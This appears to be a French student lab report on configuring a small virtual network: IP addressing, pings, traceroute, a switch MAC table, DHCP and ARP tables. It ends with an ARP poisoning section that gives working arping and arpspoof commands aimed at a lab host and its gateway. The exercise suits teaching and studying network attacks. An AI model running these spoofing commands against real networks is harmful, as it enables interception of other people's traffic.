## TP2

#  Configuration de router.tp2.efrei

- <ping google.com> 

 -- statistiques ping google.com ---
 9 paquets transmis, 9 reçus, 0% packet loss, time 8016ms
 rtt min/avg/max/mdev = 37.839/66.462/128.851/25.381 ms 

 - <ip a>
 [toto@localhost ~]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e3:c6:1a brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.245/24 brd 192.168.122.255 scope global dynamic noprefixroute enp0s3
       valid_lft 2237sec preferred_lft 2237sec
    inet6 fe80::a00:27ff:fee3:c61a/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:2c:fb:fd brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe2c:fbfd/64 scope link
       valid_lft forever preferred_lft forever


 # Configuration de node1.tp2.efrei


 - PC1> ping 10.2.1.254 
84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=6.105 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=6.964 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=7.133 ms
84 bytes from 10.2.1.254 icmp_seq=4 ttl=64 time=8.274 ms
84 bytes from 10.2.1.254 icmp_seq=5 ttl=64 time=8.095 ms

- ip 10.2.1.1/24 10.2.1.254

- PC1> ping 8.8.8.8
84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=38.900 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=40.449 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=114 time=39.094 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=114 time=36.751 ms
84 bytes from 8.8.8.8 icmp_seq=5 ttl=114 time=40.778 ms

- PC1> trace 8.8.8.8
trace to 8.8.8.8, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   8.528 ms  7.122 ms  6.770 ms
 2   192.168.122.1   11.209 ms  9.803 ms  7.357 ms
 3   10.0.3.2   7.981 ms  7.702 ms  7.970 ms
 4     *  *  *
 5     *  *  *

# Afficher la CAM Table du switch 

- IOU1#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/0
   1    0800.272c.fbfd    DYNAMIC     Et0/1
Total Mac Addresses for this criterion: 2

## Serveur DHCP 

- PC3> ip dhcp
DORA IP 10.2.1.11/24 GW 10.2.1.254

PC3> show ip

NAME        : PC3[1]
IP/MASK     : 10.2.1.11/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 360, 600/300/525
DOMAIN NAME : tp2.efrei
MAC         : 00:50:79:66:68:01
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500

## ARP

ip n s
10.2.1.10 dev enp0s3 lladdr 00:50:79:66:68:00 STALE 
192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 DELAY 
10.2.1.254 dev enp0s3 lladdr 08:00:27:0e:57:53 STALE 

- Table arp Node1

PC1> show arp       

08:00:27:8e:36:0f  10.2.1.253 expires in 117 seconds 

## ARP poisoning

### Commande attaquant avec arping

sudo arping -i gns0 -S 10.2.1.28 -s 00:00:00:00:00:01 10.2.1.100 

- Table arp node1

PC1> arp

00:00:00:00:00:01  10.2.1.28 expires in 114 seconds 

### Arpspoof

sudo arpspoof -i eth0 -t 10.2.1.100 -r 10.2.1.254

